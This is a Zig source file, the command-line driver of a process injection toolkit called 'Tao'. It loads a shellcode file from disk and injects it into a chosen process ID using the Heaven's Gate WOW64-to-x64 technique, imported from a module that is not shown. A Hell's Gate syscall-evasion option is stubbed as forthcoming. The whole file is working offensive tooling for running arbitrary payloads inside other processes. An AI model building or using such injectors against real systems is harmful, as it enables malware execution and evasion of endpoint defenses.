const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Import our modular techniques
const heaven = @import("heaven.zig");
// const hell = @import("hell.zig"); // Future Hell's Gate module

// Windows types and constants for main functionality
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const ULONG = windows.ULONG;
const LPVOID = windows.LPVOID;
const PBYTE = [*]u8;
const BOOL = windows.BOOL;
const SIZE_T = usize;
const LPCSTR = windows.LPCSTR;
const PDWORD = *DWORD;

const GENERIC_READ = windows.GENERIC_READ;
const OPEN_EXISTING = windows.OPEN_EXISTING;
const FILE_ATTRIBUTE_NORMAL = windows.FILE_ATTRIBUTE_NORMAL;
const INVALID_HANDLE_VALUE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
const INVALID_FILE_SIZE = 0xFFFFFFFF;
const HEAP_ZERO_MEMORY = 0x00000008;

// External Windows API functions for file operations
extern "kernel32" fn CreateFileA(lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: ?*anyopaque, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: ?HANDLE) callconv(WINAPI) HANDLE;
extern "kernel32" fn GetFileSize(hFile: HANDLE, lpFileSizeHigh: ?*DWORD) callconv(WINAPI) DWORD;
extern "kernel32" fn GetProcessHeap() callconv(WINAPI) HANDLE;
extern "kernel32" fn HeapAlloc(hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T) callconv(WINAPI) ?LPVOID;
extern "kernel32" fn HeapFree(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPVOID) callconv(WINAPI) BOOL;
extern "kernel32" fn ReadFile(hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: ?*DWORD, lpOverlapped: ?*anyopaque) callconv(WINAPI) BOOL;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;

/// Read a file from disk into a buffer
fn readFileFromDiskA(file_name: LPCSTR, pp_file_buffer: *PBYTE, pdw_file_size: PDWORD) BOOL {
    var file_handle: HANDLE = INVALID_HANDLE_VALUE;
    var dw_file_size: DWORD = 0;
    var dw_number_of_bytes_read: DWORD = 0;
    var p_base_addr: ?LPVOID = null;

    file_handle = CreateFileA(file_name, GENERIC_READ, 0, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
    if (file_handle == INVALID_HANDLE_VALUE) {
        print("[!] CreateFileA Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    }

    dw_file_size = GetFileSize(file_handle, null);
    if (dw_file_size == INVALID_FILE_SIZE) {
        print("[!] GetFileSize Failed With Error: {d}\n", .{GetLastError()});
        _ = CloseHandle(file_handle);
        return 0;
    }

    p_base_addr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dw_file_size);
    if (p_base_addr == null) {
        print("[!] HeapAlloc Failed With Error: {d}\n", .{GetLastError()});
        _ = CloseHandle(file_handle);
        return 0;
    }

    if (ReadFile(file_handle, p_base_addr.?, dw_file_size, &dw_number_of_bytes_read, null) == 0 or dw_file_size != dw_number_of_bytes_read) {
        print("[!] ReadFile Failed With Error: {d}\n[i] Read {d} Of {d} Bytes\n", .{ GetLastError(), dw_number_of_bytes_read, dw_file_size });
        _ = CloseHandle(file_handle);
        if (p_base_addr) |addr| {
            _ = HeapFree(GetProcessHeap(), 0, addr);
        }
        return 0;
    }

    pp_file_buffer.* = @ptrCast(p_base_addr.?);
    pdw_file_size.* = dw_file_size;

    _ = CloseHandle(file_handle);
    return if (pdw_file_size.* > 0) 1 else 0;
}

fn printUsage(program_name: []const u8) void {
    print("Tao - Advanced Process Injection Toolkit\n", .{});
    print("Usage: {s} [technique] [process_id] [shellcode_binary]\n\n", .{program_name});
    print("Techniques:\n", .{});
    print("  heaven    - Heaven's Gate (WOW64 -> x64 injection)\n", .{});
    print("  hell      - Hell's Gate (syscall obfuscation) [Coming Soon]\n", .{});
    print("\nExample:\n", .{});
    print("  {s} heaven 1234 payload.bin\n", .{program_name});
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 4) {
        printUsage(args[0]);
        std.process.exit(1);
    }

    const technique = args[1];
    const process_id_str = args[2];
    const shellcode_file = args[3];

    // Parse process ID
    const process_id = std.fmt.parseInt(ULONG, process_id_str, 10) catch {
        print("[-] Invalid process ID: {s}\n", .{process_id_str});
        std.process.exit(1);
    };

    // Read shellcode from file
    var shellcode_buf: PBYTE = undefined;
    var shellcode_len: DWORD = undefined;

    const filename_c = try allocator.dupeZ(u8, shellcode_file);
    defer allocator.free(filename_c);

    if (readFileFromDiskA(filename_c.ptr, &shellcode_buf, &shellcode_len) == 0) {
        print("[-] Failed to read file: {s}\n", .{shellcode_file});
        std.process.exit(1);
    }

    print("[*] Loaded {d} bytes of shellcode from {s}\n", .{ shellcode_len, shellcode_file });

    // Execute the specified technique
    var success = false;

    if (std.mem.eql(u8, technique, "heaven")) {
        print("[*] Using Heaven's Gate technique\n", .{});

        if (!heaven.isAvailable()) {
            print("[-] Heaven's Gate technique not available (requires WOW64 process)\n", .{});
            std.process.exit(1);
        }

        success = heaven.heavensGateInject(process_id, shellcode_buf, shellcode_len) != 0;
    } else if (std.mem.eql(u8, technique, "hell")) {
        print("[-] Hell's Gate technique not yet implemented\n", .{});
        // TODO: Implement Hell's Gate
        // success = hell.hellsGateInject(process_id, shellcode_buf, shellcode_len) != 0;
        std.process.exit(1);
    } else {
        print("[-] Unknown technique: {s}\n", .{technique});
        printUsage(args[0]);
        std.process.exit(1);
    }

    if (success) {
        print("[+] Injection successful!\n", .{});
        std.process.exit(0);
    } else {
        print("[-] Injection failed!\n", .{});
        std.process.exit(1);
    }
}
